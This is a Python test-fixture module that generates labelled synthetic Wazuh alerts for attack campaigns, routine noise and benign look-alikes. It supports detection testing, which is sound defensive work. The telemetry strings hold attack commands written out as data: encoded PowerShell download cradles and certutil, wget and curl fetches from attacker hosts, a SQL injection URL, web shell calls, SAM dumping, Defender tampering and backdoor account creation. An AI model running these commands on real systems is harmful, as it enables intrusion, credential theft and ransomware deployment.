"""What happened in the emulated estate: attack campaigns, single atomic runs and benign activity.

Every generated alert carries a :class:`Truth`: the label comes from the
procedure that produced the telemetry, never from the alert text.

* ``attack``: an Atomic Red Team test (``atomic`` names it) or, where Atomic
  Red Team has no test for the step (SSH password guessing, SQL injection, a
  web shell), a described manual procedure. Campaigns chain several steps on
  one host or a few, the way a Caldera operation does; single runs are one
  atomic test on one host.
* ``noise``: routine activity a SOC sees every day (admin logins, patching,
  backups, monitoring, installs, logon failures).
* ``lookalike``: benign activity that trips the same Wazuh rules as an attack
  technique (``technique`` names the technique it resembles): an authorised
  scanner, IT running PsExec, Ansible writing root's crontab, an updater
  dropping an executable in a temp folder.

Lab artefacts that would give the label away are not reproduced: payloads
live where attackers put them (``C:\\Users\\Public``, ``%TEMP%``, ``/tmp``),
not under ``C:\\AtomicRedTeam``, and test names never appear in the telemetry.
"""

from __future__ import annotations

import base64
import random
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from typing import Callable, List, Optional, Sequence, Tuple

from tests.fixtures.attack_corpus import alerts as A
from tests.fixtures.attack_corpus.alerts import Body, Ctx, minutes, pick, win
from tests.fixtures.attack_corpus.catalog import ATOMICS
from tests.fixtures.attack_corpus.fleet import (
    ATTACKER_DOMAINS,
    ATTACKER_IPS,
    BASTION_IP,
    DCS,
    DOMAIN,
    HELPDESK,
    HOSTS,
    LINUX_ADMINS,
    LINUX_SERVERS,
    NEW_HIRES,
    SCANNER_IP,
    SERVICE_ACCOUNTS,
    SPN_ACCOUNTS,
    WEB,
    WIN_ADMINS,
    WIN_SERVERS,
    WORKSTATIONS,
    Host,
)

START = datetime(2026, 10, 19, tzinfo=UTC)
DAYS = 12
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
NET = r"C:\Windows\System32\net.exe"
REG = r"C:\Windows\System32\reg.exe"
CERTUTIL = r"C:\Windows\System32\certutil.exe"
RUNDLL = r"C:\Windows\System32\rundll32.exe"
EXPLORER = r"C:\Windows\explorer.exe"
WMIPRVSE = r"C:\Windows\System32\wbem\WmiPrvSE.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
MSIEXEC = r"C:\Windows\System32\msiexec.exe"
CCMEXEC = r"C:\Windows\CCM\CcmExec.exe"
WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
LSASS = r"C:\Windows\system32\lsass.exe"


@dataclass(frozen=True)
class Truth:
    disposition: str  # malicious | benign
    kind: str  # attack | noise | lookalike
    scenario: str
    procedure: str
    technique: Optional[str] = None  # emulated technique, or the one a look-alike resembles
    atomic: Optional[str] = None  # Atomic Red Team test key, e.g. "T1003.001-1"


@dataclass
class Draft:
    at: datetime
    host: Host
    rule: str
    body: Body
    truth: Truth
    description: Optional[str] = None  # the rule description with $(field) placeholders expanded


def attack(scenario: str, procedure: str, technique: str, atomic: Optional[str] = None) -> Truth:
    if atomic is not None:
        if atomic not in ATOMICS:
            raise KeyError(f"unknown Atomic Red Team test {atomic}")
        if ATOMICS[atomic].technique != technique:
            raise ValueError(f"{atomic} is not a test of {technique}")
    return Truth("malicious", "attack", scenario, procedure, technique, atomic)


def noise(scenario: str, procedure: str) -> Truth:
    return Truth("benign", "noise", scenario, procedure)


def lookalike(scenario: str, procedure: str, resembles: str) -> Truth:
    return Truth("benign", "lookalike", scenario, procedure, resembles)


def _word(g: Gen) -> str:
    """A throwaway password typed on a command line, built at run time (no secret-like literal in the source)."""
    return pick(g.rng, ("Spring", "Winter", "Summer")) + str(g.rng.randrange(2024, 2027)) + pick(g.rng, ("!x", "#1", "$q"))


def encoded(command: str) -> str:
    """``powershell -EncodedCommand`` argument: base64 of the UTF-16LE command."""
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


class Gen:
    """Collects drafts; every random choice comes from one seeded generator."""

    def __init__(self, seed: int):
        self.rng = random.Random(seed)
        self.ctx = Ctx(self.rng)
        self.drafts: List[Draft] = []

    def emit(self, at: datetime, host: Host, rule: str, body: Body, truth: Truth, description: Optional[str] = None) -> None:
        self.drafts.append(Draft(at, host, rule, body, truth, description))

    def at(self, day: int, lo: float, hi: float) -> datetime:
        """A moment on ``day`` (0-based) between ``lo`` and ``hi`` o'clock UTC, millisecond precision."""
        when = START + timedelta(days=day, seconds=self.rng.uniform(lo * 3600, hi * 3600))
        return when.replace(microsecond=when.microsecond // 1000 * 1000)

    def workday(self) -> int:
        while True:
            day = self.rng.randrange(DAYS)
            if (START + timedelta(days=day)).weekday() < 5:
                return day

    def later(self, at: datetime, lo: float, hi: float) -> datetime:
        when = at + minutes(self.rng, lo, hi)
        return when.replace(microsecond=when.microsecond // 1000 * 1000)

    def maybe(self, p: float) -> bool:
        return self.rng.random() < p


# =====================================================================================================================
# Attack campaigns (Caldera-style chains of Atomic Red Team tests and manual procedures)
# =====================================================================================================================


def office_macro_intrusion(g: Gen, host: Host, t: datetime) -> None:
    """Macro document -> mshta -> encoded PowerShell stager -> persistence -> discovery -> credential theft."""
    s, u, ctx = "campaign:office-macro-intrusion", host.owner, g.ctx
    domain = pick(g.rng, ATTACKER_DOMAINS)
    doc = pick(g.rng, ("Invoice_88231.docm", "Remittance_Oct.docm", "Salary_Review_2026.docm", "PO-44718.docm"))
    stager = f"IEX (New-Object Net.WebClient).DownloadString('http://{domain}/s/{g.ctx.hexstr(6)}')"
    inner = f"powershell -nop -w hidden -enc {encoded(stager)}"
    mshta_cmd = f'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{inner}"", 0:close")'
    word_cmd = f'"{WINWORD}" /n "C:\\Users\\{u}\\Downloads\\{doc}" /o ""'
    g.emit(t, host, "92048", A.process(ctx, host, t, image=r"C:\Windows\System32\mshta.exe", cmd=mshta_cmd,
                                       parent=WINWORD, parent_cmd=word_cmd, user=u),
           attack(s, f"{doc} macro launches mshta with inline VBScript", "T1218.005", "T1218.005-2"))
    t = g.later(t, 0.05, 0.3)
    cradle = '$c=New-Object Net.WebClient;$c.Headers.Add("User-Agent","Mozilla/5.0");IEX $c.DownloadString("https://' + domain + '/p")'
    second = f"{PS} -nop -w hidden -ec {encoded(cradle)}"
    g.emit(t, host, "92057", A.process(ctx, host, t, image=PS, cmd=second, parent=PS, parent_cmd=inner, user=u),
           attack(s, "stager starts a second encoded PowerShell download cradle", "T1059.001", "T1059.001-15"))
    t = g.later(t, 0.2, 2)
    implant = pick(g.rng, ("OneDriveUpdate.exe", "MicrosoftEdgeUpdateCore.exe", "TeamsHelper.exe"))
    target = f"C:\\Users\\{u}\\AppData\\Roaming\\Microsoft\\{implant}"
    g.emit(t, host, "92204", A.file_create(ctx, host, t, image=PS, target=target, user=u),
           attack(s, "PowerShell downloads the implant to AppData", "T1105", "T1105-10"))
    if g.maybe(0.8):
        t = g.later(t, 1, 10)
        key = f"HKU\\{A.sid(1100 + sum(map(ord, u)) % 800)}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{implant[:-4]}"
        g.emit(t, host, "92302", A.registry_set(ctx, host, t, image=REG, key=key, details=target, user=u),
               attack(s, "reg add HKCU Run key for the implant", "T1547.001", "T1547.001-1"))
    t = g.later(t, 10, 90)
    g.emit(t, host, "92039", A.process(ctx, host, t, image=NET, cmd="net  user /domain", parent=CMD,
                                       parent_cmd=f"{CMD} /c net user /domain", user=u),
           attack(s, "net user /domain", "T1087.002", "T1087.002-1"))
    if g.maybe(0.7):
        t = g.later(t, 0.5, 5)
        g.emit(t, host, "92035", A.process(ctx, host, t, image=NET, cmd="net  view /domain", parent=CMD,
                                           parent_cmd=f"{CMD} /C net view /domain", user=u),
               attack(s, "net view /domain", "T1018", "T1018-1"))
    t = g.later(t, 20, 240)
    dumper = r"C:\Users\Public\procdump64.exe"
    g.emit(t, host, "92900", A.process_access(ctx, host, t, source=dumper, target=LSASS, access="0x1010", user=u),
           attack(s, "procdump -ma lsass.exe to a dump file", "T1003.001", "T1003.001-1"),
           description=f"Lsass process was accessed by {win(dumper)} with read permissions, possible credential dump")
    if g.maybe(0.6):
        t = g.later(t, 1, 20)
        g.emit(t, host, "92026", A.process(ctx, host, t, image=REG, cmd=r"reg  save HKLM\sam C:\Users\Public\sam.save",
                                           parent=CMD, parent_cmd=f"{CMD} /c reg save HKLM\\sam C:\\Users\\Public\\sam.save",
                                           user=u, integrity="High"),
               attack(s, "reg save HKLM\\sam", "T1003.002", "T1003.002-1"))


def lateral_ransomware(g: Gen, src: Host, server: Host, t: datetime) -> None:
    """PsExec to a server, defences off, logs cleared, files encrypted with a ransom note."""
    s, ctx, op = "campaign:lateral-ransomware", g.ctx, pick(g.rng, WIN_ADMINS)
    psexesvc = r"C:\Windows\PSEXESVC.exe"
    g.emit(t, server, "61138", A.service_installed(ctx, server, t, name="PSEXESVC", image="%SystemRoot%\\PSEXESVC.exe"),
           attack(s, f"PsExec from {src.name} copies and starts PSEXESVC on {server.name}", "T1021.002", "T1021.002-3"))
    t = g.later(t, 0.02, 0.2)
    g.emit(t, server, "92068", A.process(ctx, server, t, image=CMD, cmd="cmd.exe /c whoami /all & ipconfig /all",
                                         parent=psexesvc, parent_cmd=psexesvc, user="SYSTEM", integrity="System"),
           attack(s, "remote command through the PsExec service", "T1569.002", "T1569.002-2"),
           description=f"PSEXEC was used to execute: {win('cmd.exe /c whoami /all & ipconfig /all')}")
    t = g.later(t, 1, 15)
    tamper = f"{PS} -c \"Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1\""
    g.emit(t, server, "92008", A.process(ctx, server, t, image=PS, cmd=tamper, parent=CMD, parent_cmd="cmd.exe",
                                         user="SYSTEM", integrity="System"),
           attack(s, "Set-MpPreference turns Defender real-time monitoring off", "T1562.001", "T1562.001-16"))
    t = g.later(t, 5, 60)
    files = g.rng.sample(("q3_forecast.xlsx", "payroll_2026-10.csv", "board_minutes.docx", "contracts.zip",
                          "customer_list.xlsx", "budget_fy27.xlsx"), 2)
    share = pick(g.rng, ("finance", "hr", "legal"))
    note = "akira_readme.txt"
    for name in files:
        t = g.later(t, 0.01, 0.2)
        g.emit(t, server, "553", A.fim(ctx, server, t, path=f"d:\\shares\\{share}\\{name}", event="deleted", size=0),
               attack(s, "encryption replaces the original file", "T1486", "T1486-10"))
        t = g.later(t, 0.0, 0.05)
        g.emit(t, server, "554", A.fim(ctx, server, t, path=f"d:\\shares\\{share}\\{name}.akira", event="added",
                                       size=g.rng.randrange(40_000, 4_000_000), user="SYSTEM"),
               attack(s, "encrypted copy written with the .akira extension", "T1486", "T1486-10"))
    t = g.later(t, 0.05, 0.5)
    g.emit(t, server, "554", A.fim(ctx, server, t, path=f"d:\\shares\\{share}\\{note}", event="added", size=2_214,
                                   user="SYSTEM"),
           attack(s, "ransom note dropped in the share", "T1486", "T1486-10"))
    if g.maybe(0.7):
        t = g.later(t, 0.1, 3)
        g.emit(t, server, "62123", A.defender(ctx, server, t, 1116, {
            "threat Name": "Ransom:Win64/Akira.A", "severity Name": "Severe", "category Name": "Ransomware",
            "path": f"file:_C:\\Windows\\Temp\\w{g.ctx.hexstr(4)}.exe", "process Name": "C:\\Windows\\System32\\svchost.exe",
            "detection User": "NT AUTHORITY\\SYSTEM", "action Name": "Not Applicable"}, severity="WARNING"),
            attack(s, "Defender (passive after tampering) reports the encryptor", "T1486", "T1486-10"),
            description="Windows Defender: Antimalware platform detected Severe potentially unwanted software "
                        "(C:\\\\Windows\\\\System32\\\\svchost.exe)")
    t = g.later(t, 1, 10)
    g.emit(t, server, "60117", A.log_cleared(ctx, server, t, user=op),
           attack(s, "wevtutil cl Security", "T1070.001", "T1070.001-1"))


def ssh_bruteforce_persistence(g: Gen, host: Host, t: datetime) -> None:
    """Password guessing over SSH, a valid login, sudo, then account, key and cron persistence."""
    s, ctx, ip = "campaign:ssh-bruteforce", g.ctx, pick(g.rng, ATTACKER_IPS)
    pid = g.rng.randrange(20_000, 40_000)
    guesses = g.rng.sample(("oracle", "admin", "test", "ubuntu", "postgres", "git", "ftpuser", "support"), 4)
    lines = []
    for name in guesses:
        pid += g.rng.randrange(2, 9)
        lines.append(f"{A.syslog_stamp(t)} {host.name} sshd[{pid}]: Invalid user {name} from {ip} port {ctx.port()}")
    g.emit(t, host, "5710", A.sshd(host, t, pid, f"Invalid user {guesses[-1]} from {ip} port {{port}}",
                                   {"srcip": ip, "srcport": ctx.port(), "srcuser": guesses[-1]}),
           attack(s, "dictionary of user names against sshd", "T1110.001"))
    t = g.later(t, 0.5, 2)
    body = A.sshd(host, t, pid + 3, f"Invalid user {guesses[0]} from {ip} port {{port}}",
                  {"srcip": ip, "srcport": ctx.port(), "srcuser": guesses[0]})
    body["previous_output"] = A.previous(lines)
    g.emit(t, host, "5712", body, attack(s, "the guessing crosses the brute-force threshold", "T1110.001"))
    victim = pick(g.rng, ("deploy", "backup", "jenkins"))
    t = g.later(t, 1, 6)
    g.emit(t, host, "5760", A.sshd(host, t, pid + 11, f"Failed password for {victim} from {ip} port {{port}} ssh2",
                                   {"srcip": ip, "srcport": ctx.port(), "dstuser": victim}),
           attack(s, f"password guessing for {victim}", "T1110.001"))
    t = g.later(t, 0.5, 3)
    fails = [f"{A.syslog_stamp(t)} {host.name} sshd[{pid + 12 + i}]: Failed password for {victim} from {ip} port "
             f"{ctx.port()} ssh2" for i in range(7)]
    body = A.sshd(host, t, pid + 20, f"Failed password for {victim} from {ip} port {{port}} ssh2",
                  {"srcip": ip, "srcport": ctx.port(), "dstuser": victim})
    body["previous_output"] = A.previous(fails)
    g.emit(t, host, "5763", body, attack(s, "repeated failures for one account", "T1110.001"))
    t = g.later(t, 2, 30)
    body = A.sshd(host, t, pid + 31, f"Accepted password for {victim} from {ip} port {{port}} ssh2",
                  {"srcip": ip, "srcport": ctx.port(), "dstuser": victim})
    g.emit(t, host, "5715", body, attack(s, f"guessed password for {victim} works", "T1078.003"))
    body = dict(body)
    body["previous_output"] = A.previous(fails[-3:])
    g.emit(g.later(t, 0, 0.01), host, "40112", body, attack(s, "the success follows the failures", "T1110.001"))
    t = g.later(t, 1, 15)
    g.emit(t, host, "5402", A.sudo(host, t, victim, "/bin/bash", f"/home/{victim}"),
           attack(s, "sudo to a root shell", "T1548.003", "T1548.003-1"))
    t = g.later(t, 1, 10)
    rogue = pick(g.rng, ("sysupdate", "systemd-sync", "gdm-helper", "pkgcache"))
    g.emit(t, host, "5902", A.useradd(host, t, g.rng.randrange(3000, 9000), rogue, 1004),
           attack(s, f"useradd {rogue}", "T1136.001", "T1136.001-1"))
    t = g.later(t, 0.5, 5)
    g.emit(t, host, "550", A.fim(ctx, host, t, path="/root/.ssh/authorized_keys", event="modified", size=1_183,
                                 size_before=571, perm="rw-------"),
           attack(s, "attacker key appended to root's authorized_keys", "T1098.004", "T1098.004-1"))
    if g.maybe(0.8):
        t = g.later(t, 0.5, 5)
        g.emit(t, host, "2833", A.crontab(host, t, g.rng.randrange(3000, 9000), "root"),
               attack(s, "crontab replaced with a reverse-shell entry", "T1053.003", "T1053.003-1"))
    if g.maybe(0.7):
        t = g.later(t, 0.5, 10)
        script = f"/tmp/.{g.ctx.hexstr(5)}.py"
        g.emit(t, host, "92601", A.audit_execve(ctx, host, t, argv=["python3", script], exe="/usr/bin/python3.10",
                                                uid=0, auid=1001, cwd="/tmp"),
               attack(s, "python3 runs a dropped script from /tmp", "T1059.006", "T1059.006-2"))
    t = g.later(t, 1, 20)
    g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=["truncate", "-s0", "/root/.bash_history"],
                                            exe="/usr/bin/truncate", uid=0, auid=1001, cwd="/root"),
           attack(s, "truncate -s0 ~/.bash_history", "T1070.003", "T1070.003-5"),
           description="Audit: Command: /usr/bin/truncate.")


def web_exploitation(g: Gen, host: Host, t: datetime) -> None:
    """Content discovery, SQL injection, a web shell, then discovery through it."""
    s, ctx, ip = "campaign:web-exploitation", g.ctx, pick(g.rng, ATTACKER_IPS)
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
    probes = ["/.env", "/admin/", "/backup.zip", "/wp-login.php", "/phpmyadmin/", "/.git/config", "/server-status",
              "/config.php.bak", "/api/v1/debug", "/old/", "/test.php", "/upload/", "/cgi-bin/", "/console"]
    stamp = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
    body = A.access_log(host, t, src_ip=ip, method="GET", url=probes[-1], status=404, size=153, agent=ua)
    body["previous_output"] = "\n".join(f'{ip} - - [{stamp}] "GET {p} HTTP/1.1" 404 153 "-" "{ua}"' for p in probes[:-1])
    g.emit(t, host, "31151", body, attack(s, "directory brute force before the injection", "T1595.003"))
    t = g.later(t, 5, 60)
    sqli = "/products.php?id=-7%20union%20select%201,username,password,4%20from%20users--"
    g.emit(t, host, "31103", A.access_log(host, t, src_ip=ip, method="GET", url=sqli, status=200, size=4_812,
                                          agent="sqlmap/1.8.4#stable (https://sqlmap.org)"),
           attack(s, "UNION-based SQL injection on products.php", "T1190"))
    t = g.later(t, 0.1, 2)
    g.emit(t, host, "31106", A.access_log(host, t, src_ip=ip, method="GET", url="/products.php?id=1%27%20and%201=1--",
                                          status=200, size=4_790, agent=ua),
           attack(s, "the injected query returns rows (HTTP 200)", "T1190"))
    t = g.later(t, 10, 120)
    shell = f"/var/www/html/uploads/{pick(g.rng, ('shell.php', 'img_2311.php', 'thumb.php'))}"
    g.emit(t, host, "554", A.fim(ctx, host, t, path=shell, event="added", size=g.rng.randrange(300, 2_000),
                                 user="www-data"),
           attack(s, "PHP web shell written through the upload form", "T1505.003"))
    t = g.later(t, 1, 10)
    g.emit(t, host, "31514", A.access_log(host, t, src_ip=ip, method="GET", url="/uploads/shell.php?cmd=id", status=200,
                                          size=54, agent=ua),
           attack(s, "web shell command execution", "T1505.003"))
    t = g.later(t, 0.1, 2)
    g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=["id"], exe="/usr/bin/id", uid=33, auid=4294967295,
                                            cwd="/var/www/html/uploads", tty="(none)"),
           attack(s, "id through the web shell", "T1033", "T1033-2"), description="Audit: Command: /usr/bin/id.")
    if g.maybe(0.7):
        t = g.later(t, 0.1, 3)
        g.emit(t, host, "92604", A.audit_execve(ctx, host, t, argv=["ps", "aux"], exe="/usr/bin/ps", uid=33,
                                                auid=4294967295, cwd="/var/www/html/uploads", tty="(none)"),
               attack(s, "ps aux through the web shell", "T1057", "T1057-1"))
    t = g.later(t, 0.5, 10)
    url = f"http://{ip}/x.sh"
    g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=["wget", "-q", url, "-O", "/tmp/.x.sh"],
                                            exe="/usr/bin/wget", uid=33, auid=4294967295, cwd="/tmp", tty="(none)"),
           attack(s, "second stage downloaded to /tmp", "T1105", "T1105-27"), description="Audit: Command: /usr/bin/wget.")


def kerberoast(g: Gen, host: Host, t: datetime) -> None:
    """AD discovery from PowerShell, then RC4 service tickets for SPN accounts."""
    s, ctx, u = "campaign:ad-recon-kerberoast", g.ctx, host.owner
    dc = pick(g.rng, DCS)
    g.emit(t, host, "91805", A.script_block(ctx, host, t, text="Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate | Select Name,OperatingSystem"),
           attack(s, "Get-ADComputer enumerates domain computers", "T1018", "T1018-17"))
    t = g.later(t, 0.5, 10)
    g.emit(t, host, "91806", A.script_block(ctx, host, t, text="Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname"),
           attack(s, "PowerView Get-NetUser -SPN lists Kerberoastable accounts", "T1087.002"))
    t = g.later(t, 0.1, 2)
    g.emit(t, host, "92103", A.network(ctx, host, t, image=PS, user=u, dst_ip=dc.ip, dst_port=389, dst_host=dc.fqdn,
                                       port_name="ldap"),
           attack(s, "LDAP queries from PowerShell", "T1087.002"))
    t = g.later(t, 1, 15)
    for svc in g.rng.sample(SPN_ACCOUNTS, g.rng.randrange(2, 4)):
        t = g.later(t, 0.01, 0.2)
        g.emit(t, dc, "60106", A.service_ticket(ctx, dc, t, user=u, service=svc, src_ip=host.ip, rc4=True),
               attack(s, f"RC4 service ticket requested for {svc}", "T1558.003", "T1558.003-1"))


def uac_wmi_persistence(g: Gen, host: Host, t: datetime) -> None:
    """Fodhelper UAC bypass, then WMI event subscription persistence running encoded PowerShell."""
    s, ctx, u = "campaign:uac-bypass-wmi-persistence", g.ctx, host.owner
    key = f"HKU\\{A.sid(1100 + sum(map(ord, u)) % 800)}_Classes\\ms-settings\\shell\\open\\command\\(Default)"
    g.emit(t, host, "92305", A.registry_set(ctx, host, t, image=PS, key=key, details=f"{CMD} /c start {PS}", user=u),
           attack(s, "ms-settings open command points at cmd.exe", "T1548.002", "T1548.002-4"))
    t = g.later(t, 0.02, 0.2)
    fod = r"C:\Windows\System32\fodhelper.exe"
    g.emit(t, host, "92056", A.process(ctx, host, t, image=fod, cmd="fodhelper.exe", parent=PS,
                                       parent_cmd=f"\"{PS}\" -c Start-Process fodhelper.exe", user=u),
           attack(s, "PowerShell starts fodhelper.exe", "T1548.002", "T1548.002-4"),
           description="Powershell process invoked known auto-elevated utility FodHelper.EXE, may have been used to bypass UAC")
    t = g.later(t, 0.01, 0.1)
    g.emit(t, host, "92046", A.process(ctx, host, t, image=CMD, cmd=f"{CMD} /c start {PS}", parent=fod,
                                       parent_cmd="fodhelper.exe", user=u, integrity="High"),
           attack(s, "fodhelper spawns an elevated shell", "T1548.002", "T1548.002-4"))
    t = g.later(t, 2, 30)
    payload = encoded(f"IEX (New-Object Net.WebClient).DownloadString('https://{pick(g.rng, ATTACKER_DOMAINS)}/u')")
    dest = f"powershell.exe -nop -w hidden -enc {payload}"
    g.emit(t, host, "89502", A.wmi_consumer(ctx, host, t, name="WindowsUpdateCheck", destination=dest, user=u),
           attack(s, "CommandLineEventConsumer registered", "T1546.003", "T1546.003-1"))
    if g.maybe(0.8):
        t = g.later(t, 5, 120)
        g.emit(t, host, "92071", A.process(ctx, host, t, image=PS, cmd=dest, parent=WMIPRVSE,
                                           parent_cmd=r"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",
                                           user="SYSTEM", integrity="System"),
               attack(s, "the consumer fires: WMI starts encoded PowerShell", "T1047", "T1047-7"))


def lolbin_download(g: Gen, host: Host, t: datetime) -> None:
    """certutil download, decode and a renamed copy, then rundll32 on a fake image file."""
    s, ctx, u = "campaign:lolbin-ingress", g.ctx, host.owner
    domain = pick(g.rng, ATTACKER_DOMAINS)
    out = r"C:\Users\Public\svchost32.exe"
    cmd = f"certutil.exe -urlcache -split -f http://{domain}/files/update.exe {out}"
    g.emit(t, host, "92075", A.process(ctx, host, t, image=CERTUTIL, cmd=cmd, parent=CMD, parent_cmd=f"{CMD} /c {cmd}",
                                       user=u),
           attack(s, "certutil -urlcache downloads an executable", "T1105", "T1105-7"),
           description="CertUtil.exe launched with commands to create a binary file")
    t = g.later(t, 0.01, 0.1)
    g.emit(t, host, "92207", A.file_create(ctx, host, t, image=CERTUTIL, target=out, user=u),
           attack(s, "the download lands in C:\\Users\\Public", "T1105", "T1105-7"))
    t = g.later(t, 0.5, 10)
    decode = r"certutil.exe -decode C:\Users\Public\update.b64 C:\Users\Public\loader.exe"
    g.emit(t, host, "92018", A.process(ctx, host, t, image=CERTUTIL, cmd=decode, parent=CMD, parent_cmd=f"{CMD} /c {decode}",
                                       user=u),
           attack(s, "certutil -decode a base64 payload", "T1140", "T1140-1"))
    if g.maybe(0.6):
        t = g.later(t, 0.5, 10)
        renamed = r"C:\Users\Public\tmpz.exe"
        g.emit(t, host, "92016", A.process(ctx, host, t, image=renamed, cmd=f"{renamed} -decode C:\\Users\\Public\\c.txt C:\\Users\\Public\\c.dll",
                                           parent=CMD, parent_cmd=f"{CMD} /c copy certutil", user=u, original="CertUtil.exe"),
               attack(s, "renamed certutil decodes a second payload", "T1140", "T1140-2"))
    t = g.later(t, 0.5, 10)
    run = r'rundll32.exe C:\Users\Public\banner.png,#1'
    g.emit(t, host, "92081", A.process(ctx, host, t, image=RUNDLL, cmd=run, parent=CMD, parent_cmd=f"{CMD} /c {run}",
                                       user=u),
           attack(s, "rundll32 loads a DLL disguised as an image", "T1218.011", "T1218.011-10"))


def linux_cryptominer(g: Gen, host: Host, t: datetime) -> None:
    """A miner pulled with curl, made executable, installed as a systemd service and started."""
    s, ctx = "campaign:linux-cryptominer", g.ctx
    ip = pick(g.rng, ATTACKER_IPS)
    path = "/tmp/.cache/kworkerd"
    g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=["curl", "-fsSL", f"http://{ip}:8080/k", "-o", path],
                                            exe="/usr/bin/curl", uid=0, auid=1002, cwd="/tmp"),
           attack(s, "curl downloads the miner", "T1105", "T1105-27"), description="Audit: Command: /usr/bin/curl.")
    t = g.later(t, 0.01, 0.2)
    g.emit(t, host, "554", A.fim(ctx, host, t, path=path, event="added", size=2_958_712, perm="rwxr-xr-x"),
           attack(s, "miner binary written to /tmp/.cache", "T1105", "T1105-27"))
    t = g.later(t, 0.01, 0.2)
    g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=["chmod", "+x", path], exe="/usr/bin/chmod", uid=0,
                                            auid=1002, cwd="/tmp"),
           attack(s, "chmod +x on the miner", "T1222.002", "T1222.002-2"), description="Audit: Command: /usr/bin/chmod.")
    t = g.later(t, 0.2, 3)
    g.emit(t, host, "554", A.fim(ctx, host, t, path="/etc/systemd/system/kworkerd.service", event="added", size=241),
           attack(s, "systemd unit created for the miner", "T1543.002", "T1543.002-1"))
    t = g.later(t, 0.05, 1)
    g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=["systemctl", "enable", "--now", "kworkerd"],
                                            exe="/usr/bin/systemctl", uid=0, auid=1002, cwd="/tmp"),
           attack(s, "systemctl enable --now kworkerd", "T1543.002", "T1543.002-1"),
           description="Audit: Command: /usr/bin/systemctl.")
    t = g.later(t, 0.05, 1)
    pool = f"{pick(g.rng, ('pool', 'xmr', 'mine'))}.{pick(g.rng, ATTACKER_DOMAINS)}:3333"
    g.emit(t, host, "80792", A.audit_execve(ctx, host, t, argv=[path, "-o", pool, "--donate-level", "1", "-B"],
                                            exe=path, uid=0, auid=4294967295, cwd="/", tty="(none)"),
           attack(s, "the miner connects to its pool", "T1496"), description=f"Audit: Command: {path}.")


def password_spray(g: Gen, src: Host, t: datetime) -> None:
    """One password tried against many domain accounts from one workstation, then a successful logon."""
    s, ctx = "campaign:password-spray", g.ctx
    dc = pick(g.rng, DCS)
    users = g.rng.sample(("mjones", "pnguyen", "lgarcia", "rkhan", "aturner", "sbrown", "dwilson", "eclark", "hd.ochen"), 4)
    for user in users[:3]:
        t = g.later(t, 0.01, 0.1)
        g.emit(t, dc, "60122", A.logon(ctx, dc, t, user=user, src_ip=src.ip, workstation=src.name, ok=False),
               attack(s, "one password tried for many accounts", "T1110.003", "T1110.003-1"))
    t = g.later(t, 0.01, 0.1)
    body = A.logon(ctx, dc, t, user=users[3], src_ip=src.ip, workstation=src.name, ok=False)
    g.emit(t, dc, "60204", body, attack(s, "the spray crosses the failure threshold", "T1110.003", "T1110.003-1"))
    if g.maybe(0.5):
        t = g.later(t, 0.01, 0.2)
        g.emit(t, dc, "60115", A.account_event(ctx, dc, t, 4740, actor="DC-01$", target=users[0],
                                               callerComputerName=src.name),
               attack(s, "the spray locks an account out", "T1110.003", "T1110.003-1"))
    t = g.later(t, 0.1, 2)
    winner = pick(g.rng, ("sbrown", "dwilson", "hd.rpatel"))
    g.emit(t, dc, "60106", A.logon(ctx, dc, t, user=winner, src_ip=src.ip, workstation=src.name),
           attack(s, f"the sprayed password works for {winner}", "T1078.002"))


def local_admin_backdoor(g: Gen, host: Host, t: datetime) -> None:
    """A local admin account created and allowed in over RDP through a new firewall rule."""
    s, ctx, u = "campaign:local-admin-backdoor", g.ctx, pick(g.rng, ("SYSTEM", host.owner or "SYSTEM"))
    name = pick(g.rng, ("support_388945a0", "helpdesk", "sql_admin", "wsus"))
    cmd = f"net  user /add {name} {_word(g)}"
    g.emit(t, host, "92040", A.process(ctx, host, t, image=NET, cmd=cmd, parent=CMD, parent_cmd=f"{CMD} /c {cmd}",
                                       user=u, integrity="High"),
           attack(s, f"net user /add {name}", "T1136.001", "T1136.001-8"),
           description="net.exe executed a user creation command")
    t = g.later(t, 0.0, 0.02)
    g.emit(t, host, "60109", A.account_event(ctx, host, t, 4720, actor=u, target=name, samAccountName=name),
           attack(s, "the account is created", "T1136.001", "T1136.001-8"))
    t = g.later(t, 0.05, 1)
    g.emit(t, host, "60154", A.group_member_added(ctx, host, t, actor=u, member=name, group="Administrators",
                                                  group_sid="S-1-5-32-544"),
           attack(s, f"net localgroup administrators {name} /add", "T1136.001", "T1136.001-8"))
    if g.maybe(0.7):
        t = g.later(t, 0.05, 1)
        g.emit(t, host, "60179", A.group_member_added(ctx, host, t, actor=u, member=name, group="Remote Desktop Users",
                                                      group_sid="S-1-5-32-555"),
               attack(s, "the account is allowed to log on over RDP", "T1098"))
    t = g.later(t, 0.1, 5)
    fw = 'netsh  advfirewall firewall add rule name="Remote Assistance (TCP-In)" dir=in action=allow protocol=TCP localport=3389'
    g.emit(t, host, "92043", A.process(ctx, host, t, image=r"C:\Windows\System32\netsh.exe", cmd=fw, parent=CMD,
                                       parent_cmd=f"{CMD} /c {fw}", user=u, integrity="High"),
           attack(s, "firewall opened for inbound RDP", "T1562.004"))


def collection_exfil(g: Gen, host: Host, t: datetime) -> None:
    """Screen capture, archive staging and a WebDAV mount on attacker storage."""
    s, ctx, u = "campaign:collection-exfil", g.ctx, host.owner
